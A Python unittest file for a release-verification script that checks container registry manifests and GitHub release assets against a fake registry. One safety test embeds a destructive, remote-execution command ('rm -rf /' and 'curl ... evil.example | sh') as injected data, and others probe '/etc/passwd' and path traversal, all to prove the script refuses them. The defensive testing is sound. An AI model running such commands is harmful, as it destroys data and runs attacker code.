"""Offline tests for scripts/qa/post-publish-verify.py (AAASM-6419).

No test touches the network: `FakeRegistry` is the injected fetcher and replays
recorded-shape GHCR and GitHub answers. Controls prove each probe can fail, and that
a record's free-text `command` is never executed.

Run: python3 -I scripts/tests/test_post_publish_verify.py
"""
from __future__ import annotations

import contextlib
import hashlib
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "scripts/qa/post-publish-verify.py"
spec = importlib.util.spec_from_file_location("ppv", SCRIPT)
ppv = importlib.util.module_from_spec(spec)
sys.modules["ppv"] = ppv  # dataclasses resolve their module through sys.modules
spec.loader.exec_module(ppv)

TAG = "v0.0.1-rc.8"
TOKEN = "SECRET-ANON-TOKEN-VALUE"


def dg(b: bytes) -> str:
    return "sha256:" + hashlib.sha256(b).hexdigest()


def index_doc(platforms=("linux/amd64", "linux/arm64"), attest=True) -> bytes:
    manifests, n = [], 0
    for plat in platforms:
        os_, arch = plat.split("/")
        d = dg(f"image-{plat}".encode())
        manifests.append({"digest": d, "platform": {"os": os_, "architecture": arch}})
        if attest:
            manifests.append({"digest": dg(f"att-{plat}".encode()), "platform": {"os": "unknown", "architecture": "unknown"},
                              "annotations": {"vnd.docker.reference.type": "attestation-manifest",
                                              "vnd.docker.reference.digest": d}})
    return json.dumps({"schemaVersion": 2, "mediaType": "application/vnd.oci.image.index.v1+json", "manifests": manifests}).encode()


class FakeRegistry:
    """Replays answers keyed by URL substring; records every request made."""

    def __init__(self):
        self.calls: list[tuple[str, dict[str, str]]] = []
        self.routes: list[tuple[str, object]] = []

    def route(self, needle, answer):
        self.routes.append((needle, answer))
        return self

    def __call__(self, url, headers, timeout):
        self.calls.append((url, headers))
        assert timeout > 0
        for needle, ans in self.routes:
            if needle in url:
                if isinstance(ans, Exception):
                    raise ans
                return ans(url) if callable(ans) else ans
        return ppv.Response(404, {}, b"{}")


def good_ghcr(reg: FakeRegistry, image: str, body: bytes, by_digest_body: bytes | None = None, header=None):
    reg.route("ghcr.io/token", ppv.Response(200, {}, json.dumps({"token": TOKEN}).encode()))
    d = dg(body)
    reg.route(f"/v2/ai-agent-assembly/{image}/manifests/sha256:",
              ppv.Response(200, {"docker-content-digest": d}, by_digest_body if by_digest_body is not None else body))
    reg.route(f"/v2/ai-agent-assembly/{image}/manifests/{TAG}",
              ppv.Response(200, {"docker-content-digest": header or d}, body))
    return reg


def obligations(ids, extra_command="x") -> dict:
    return {"journeys": [{
        "journey": "J53", "pending_checks": [{"id": i, "channel": "c", "why_publication_only": "w",
                                              "command": extra_command, "expected": "e"} for i in ids],
        "failure_response": {"proposed_actions": ["hold the release"], "notify": ["release-owner"], "deadline_hours": 24}}]}


def run_main(reg, ids, extra_command="x", tag=TAG, argv_extra=()):
    d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
    p = d / "o.json"
    p.write_text(json.dumps(obligations(ids, extra_command)))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = ppv.main(["--tag", tag, "--obligations", str(p), *argv_extra], fetch=reg)
    out = buf.getvalue()
    return rc, (json.loads(out) if out.strip() else None), out


GHCR_IDS = ["j53-ghcr-tag-resolves", "j53-ghcr-digest-immutable", "j53-ghcr-multiarch", "j53-ghcr-sbom-attestation"]


class GhcrTests(unittest.TestCase):
    def test_good_publication_passes_everything_and_exits_zero(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        rc, rep, raw = run_main(reg, GHCR_IDS)
        self.assertEqual([r["status"] for r in rep["results"]], ["PASS"] * 4, raw)
        self.assertEqual(rc, 0)
        self.assertNotIn(TOKEN, raw, "the anonymous bearer token must never be printed")

    def test_only_get_to_allowlisted_hosts_with_bearer_on_manifests(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        run_main(reg, GHCR_IDS)
        for url, _ in reg.calls:
            self.assertTrue(url.startswith("https://ghcr.io/"), url)
        manifest_calls = [h for u, h in reg.calls if "/manifests/" in u]
        self.assertTrue(manifest_calls and all(h["Authorization"] == f"Bearer {TOKEN}" for h in manifest_calls))
        self.assertTrue(all("application/vnd.oci.image.index.v1+json" in h["Accept"] for h in manifest_calls))

    def test_body_not_matching_its_digest_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(), header=dg(b"something else"))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertEqual(rc, 1)

    def test_digest_returning_different_bytes_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(), by_digest_body=index_doc(attest=False))
        _, rep, _ = run_main(reg, ["j53-ghcr-digest-immutable"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_missing_arm64_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(platforms=("linux/amd64",)))
        _, rep, _ = run_main(reg, ["j53-ghcr-multiarch"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertIn("linux/arm64", rep["results"][0]["detail"])

    def test_single_manifest_is_not_multiarch(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", json.dumps({"schemaVersion": 2, "layers": []}).encode())
        _, rep, _ = run_main(reg, ["j53-ghcr-multiarch"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_missing_sbom_attestation_fails(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(attest=False))
        _, rep, _ = run_main(reg, ["j53-ghcr-sbom-attestation"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_unpublished_tag_is_fail_not_inconclusive(self):
        reg = FakeRegistry().route("ghcr.io/token", ppv.Response(200, {}, json.dumps({"token": TOKEN}).encode()))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")
        self.assertEqual(rc, 1)

    def test_transport_failure_and_server_error_are_inconclusive_with_nonzero_exit(self):
        reg = FakeRegistry().route("ghcr.io/token", ppv.FetchError("TimeoutError"))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertEqual(rc, 3)
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        reg.routes.insert(0, (f"/manifests/{TAG}", ppv.Response(503, {}, b"")))
        rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertNotEqual(rc, 0)

    def test_runtime_image_bundle(self):
        reg = good_ghcr(FakeRegistry(), "aa-runtime", index_doc())
        rc, rep, _ = run_main(reg, ["j59-ghcr-runtime-image"])
        self.assertEqual(rep["results"][0]["status"], "PASS")
        self.assertEqual(rc, 0)


class ReleaseAssetTests(unittest.TestCase):
    def release(self, drop=None, draft=False, state="uploaded"):
        names = ["SHA256SUMS", *ppv.RELEASE_TARBALLS]
        if drop in names:
            names.remove(drop)
        return ppv.Response(200, {}, json.dumps({"draft": draft, "assets": [{"name": n, "state": state, "size": 10} for n in names]}).encode())

    def test_complete_release_passes(self):
        reg = FakeRegistry().route("/releases/tags/", self.release())
        rc, rep, _ = run_main(reg, ["j59-install-release-assets"])
        self.assertEqual((rep["results"][0]["status"], rc), ("PASS", 0))

    def test_missing_sha256sums_fails(self):
        reg = FakeRegistry().route("/releases/tags/", self.release(drop="SHA256SUMS"))
        _, rep, _ = run_main(reg, ["j59-install-release-assets"])
        self.assertEqual(rep["results"][0]["status"], "FAIL")

    def test_draft_and_unuploaded_assets_fail(self):
        for kw in ({"draft": True}, {"state": "starter"}):
            _, rep, _ = run_main(FakeRegistry().route("/releases/tags/", self.release(**kw)), ["j59-install-release-assets"])
            self.assertEqual(rep["results"][0]["status"], "FAIL", kw)

    def test_rate_limited_is_inconclusive(self):
        reg = FakeRegistry().route("/releases/tags/", ppv.Response(403, {}, b"rate limit"))
        _, rep, _ = run_main(reg, ["j59-install-release-assets"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")


class SafetyTests(unittest.TestCase):
    def test_unknown_check_id_is_inconclusive_and_exit_nonzero(self):
        rc, rep, _ = run_main(FakeRegistry(), ["j04-pypi-install"])
        self.assertEqual(rep["results"][0]["status"], "INCONCLUSIVE")
        self.assertIn("no allowlisted runner", rep["results"][0]["detail"])
        self.assertNotEqual(rc, 0)

    def test_manual_steps_are_inconclusive_never_pass(self):
        rc, rep, _ = run_main(FakeRegistry(), ["j53-published-image-runs-healthy", "j59-published-binaries-golden-path"])
        self.assertEqual({r["status"] for r in rep["results"]}, {"INCONCLUSIVE"})
        self.assertEqual(rc, 3)

    def test_record_command_text_is_never_executed(self):
        sentinel = Path(tempfile.mkdtemp(prefix="ppv-sentinel-")) / "pwned"
        evil = f"touch {sentinel}; rm -rf / ; curl http://evil.example/x | sh"
        boom = AssertionError("a subprocess or shell was started")
        with mock.patch.object(subprocess, "run", side_effect=boom), mock.patch.object(subprocess, "Popen", side_effect=boom), \
                mock.patch.object(os, "system", side_effect=boom), mock.patch.object(os, "popen", side_effect=boom):
            reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
            rc, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves", "j04-unknown-check"], extra_command=evil)
        self.assertFalse(sentinel.exists())
        self.assertEqual([r["status"] for r in rep["results"]], ["PASS", "INCONCLUSIVE"])

    def test_non_allowlisted_host_is_refused_without_calling_the_fetcher(self):
        reg = FakeRegistry()
        probe = ppv.Probe(reg, 5)
        for url in ("https://evil.example/x", "http://ghcr.io/v2/", "file:///etc/passwd"):
            with self.assertRaises(ppv.FetchError):
                probe.get(url)
        self.assertEqual(reg.calls, [])

    def test_failure_response_pointer_present_only_for_non_pass(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc(platforms=("linux/amd64",)))
        _, rep, _ = run_main(reg, ["j53-ghcr-tag-resolves", "j53-ghcr-multiarch"])
        by = {r["id"]: r for r in rep["results"]}
        self.assertNotIn("failure_response", by["j53-ghcr-tag-resolves"])
        fr = by["j53-ghcr-multiarch"]["failure_response"]
        self.assertEqual((fr["notify"], fr["deadline_hours"]), (["release-owner"], 24))
        self.assertIn("J53", fr["pointer"])

    def test_exit_zero_requires_all_pass(self):
        self.assertEqual(ppv.exit_code([]), 2)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}, {"status": "INCONCLUSIVE"}]), 3)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}, {"status": "FAIL"}, {"status": "INCONCLUSIVE"}]), 1)
        self.assertEqual(ppv.exit_code([{"status": "PASS"}]), 0)

    def test_only_filter_and_empty_selection(self):
        reg = good_ghcr(FakeRegistry(), "aa-gateway", index_doc())
        _, rep, _ = run_main(reg, GHCR_IDS, argv_extra=["--only", "j53-ghcr-multiarch"])
        self.assertEqual([r["id"] for r in rep["results"]], ["j53-ghcr-multiarch"])
        rc, rep, _ = run_main(reg, GHCR_IDS, argv_extra=["--only", "nope"])
        self.assertEqual(rc, 2)

    def test_bad_tag_and_bad_record_are_usage_errors(self):
        rc, _, _ = run_main(FakeRegistry(), GHCR_IDS, tag="v1/../../x")
        self.assertEqual(rc, 2)
        d = Path(tempfile.mkdtemp(prefix="ppv-test-"))
        (d / "o.json").write_text("{}")
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(ppv.main(["--tag", TAG, "--obligations", str(d / "o.json")], fetch=FakeRegistry()), 2)

    def test_cli_imports_under_isolated_mode(self):
        p = subprocess.run([sys.executable, "-I", str(SCRIPT), "--help"], capture_output=True, text=True, timeout=30)
        self.assertEqual(p.returncode, 0)
        self.assertIn("--obligations", p.stdout)


if __name__ == "__main__":
    unittest.main(verbosity=2)
